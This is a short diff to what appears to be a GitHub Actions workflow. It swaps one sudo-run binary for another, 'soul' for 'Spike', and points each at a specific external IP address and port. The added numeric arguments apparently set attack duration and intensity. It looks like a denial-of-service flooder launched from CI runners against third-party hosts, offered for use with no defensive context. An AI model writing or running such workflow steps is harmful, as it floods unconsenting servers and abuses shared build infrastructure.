@@ -20,4 +20,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x *
-      - run: sudo ./soul 138.201.139.144 80 300
+      - run: sudo ./Spike 20.192.27.142 21565 200 1024 900
